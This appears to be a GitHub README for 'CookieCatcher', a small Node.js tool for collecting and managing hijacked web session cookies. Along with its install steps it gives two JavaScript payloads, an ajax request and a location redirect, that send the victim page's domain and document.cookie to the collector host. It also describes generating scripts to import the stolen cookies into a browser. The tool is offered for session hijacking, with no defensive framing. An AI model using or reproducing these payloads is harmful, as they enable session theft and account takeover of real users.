# CookieCatcher (v 0.0.1)
This is a mini and simple API REST for management of Web sessions that were hijacked.

<center><img src="http://2.bp.blogspot.com/-1H9hR_zOsP8/VTflh5wSpEI/AAAAAAAAAPs/MoLPDkpRRuI/s1600/Screen%2BShot%2B2015-04-22%2Bat%2B1.18.09%2BPM.png"></center>

### Features (that is simple)
- Capture request through GET, POST, HEAD, OPTIONS, DELETE, PUT or PATCH (methods)
- Parse to cookies format
- Create script to import into your browser



### How to install this little devil?
##### Require
 - nodejs 0.10+

```sh
$ git https://github.com/JavaGarcia/CookieCatcher.git
$ cd CookieCatcher
$ npm install
$ sudo DEBUG=APIcookies:* ./bin/www
```

### Scheme to send requests
Example with ajax (POST or GET)
```javascript
$.ajax({
        type: "POST",//or GET
        url: "http://cookieCatcher/session",//obviously change (cookieCatcher).
        data:"domain="+document.domain+"&cookie="+document.cookie,
        success: function(datos){/*if you want to show something.*/}
});
```
Normal request GET (redirect)
```javascript
document.location.href="http://cookieCatcher/session/"+document.domain+"/"+document.cookie;
```
You can see the file: example.html

#### Made with love in Colombia.
# License:

CookieCatcher is licensed under the GPLv3: http://www.gnu.org/licenses/gpl-3.0.html. 

